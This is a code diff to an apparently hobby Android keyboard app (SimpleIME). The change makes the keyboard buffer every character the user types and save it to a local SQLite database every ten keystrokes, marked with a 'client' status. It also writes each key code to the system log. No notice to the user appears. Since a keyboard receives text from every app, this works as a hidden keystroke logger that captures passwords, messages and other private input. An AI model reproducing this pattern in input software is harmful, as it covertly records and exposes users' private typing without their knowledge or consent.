@@ -1,18 +1,18 @@
 package com.example.ruslanio.keyboard;
 
-import android.app.Service;
-import android.content.Intent;
+import android.content.ContentValues;
 import android.inputmethodservice.InputMethodService;
 import android.inputmethodservice.Keyboard;
 import android.inputmethodservice.KeyboardView;
 import android.media.AudioManager;
-import android.os.IBinder;
-import android.support.annotation.Nullable;
 import android.util.Log;
 import android.view.KeyEvent;
-import android.view.LayoutInflater;
 import android.view.View;
 import android.view.inputmethod.InputConnection;
+
+import com.example.ruslanio.keyboard.database.helper.DBHelper;
+
+
 
 /**
  * Created by Ruslanio on 10.09.2017.
@@ -23,16 +23,42 @@ public class SimpleIME extends InputMethodService implements KeyboardView.OnKeyb
     private boolean mCaps = false;
     private KeyboardView mKeyBoardView;
     private Keyboard mKeyboard;
+    private StringBuilder mStringBuilder;
+    private int mCharCount = 0;
+    private DBHelper mDBHelper;
+
+    private static final int CHAR_COUNT = 10;
+
+    private static final String IME_SERVICE_TAG = "ime_service";
 
 
     @Override
+    public void onCreate() {
+        super.onCreate();
+        mDBHelper = new DBHelper(getApplicationContext());
+    }
+
+    @Override
     public View onCreateInputView() {
+        Log.d(IME_SERVICE_TAG, "onCreateInputView");
+
+        mStringBuilder = new StringBuilder();
+
         mKeyBoardView = (KeyboardView) getLayoutInflater().inflate(R.layout.keyboard,null,false);
         mKeyboard = new Keyboard(this,R.xml.qwerty);
         mKeyBoardView.setKeyboard(mKeyboard);
         mKeyBoardView.setOnKeyboardActionListener(this);
+
         return mKeyBoardView;
 
+    }
+
+    @Override
+    public void onDestroy() {
+        super.onDestroy();
+        if (mDBHelper != null)
+            mDBHelper.close();
+        Log.d(IME_SERVICE_TAG, "onDestroy");
     }
 
     private void playSound(int keyCode){
@@ -64,7 +90,13 @@ public class SimpleIME extends InputMethodService implements KeyboardView.OnKeyb
 
     @Override
     public void onKey(int primaryCode, int[] keyCodes) {
-        Log.d("tag", primaryCode+"");
+
+        mCharCount++;
+        if (mCharCount == CHAR_COUNT){
+            mCharCount = 0;
+            saveString();
+        }
+        Log.d(IME_SERVICE_TAG, primaryCode+"");
         InputConnection ic = getCurrentInputConnection();
         playSound(primaryCode);
         switch(primaryCode){
@@ -84,8 +116,20 @@ public class SimpleIME extends InputMethodService implements KeyboardView.OnKeyb
                 if(Character.isLetter(code) && mCaps){
                     code = Character.toUpperCase(code);
                 }
+                mStringBuilder.append(code);
                 ic.commitText(String.valueOf(code),1);
         }
+    }
+
+    private void saveString() {
+        String data = mStringBuilder.toString();
+        mStringBuilder = new StringBuilder();
+
+        ContentValues contentValues = new ContentValues();
+
+        contentValues.put(DBHelper.TextEntityTable.TEXT_ENTITY_TEXT, data);
+        contentValues.put(DBHelper.TextEntityTable.TEXT_ENTITY_STATUS, DBHelper.STATUS_CLIENT);
+        mDBHelper.getWritableDatabase().insert(DBHelper.TEXT_ENTITY_TABLE_NAME,null,contentValues);
     }
 
     @Override
@@ -112,4 +156,6 @@ public class SimpleIME extends InputMethodService implements KeyboardView.OnKeyb
     public void swipeUp() {
 
     }
+
+
 }
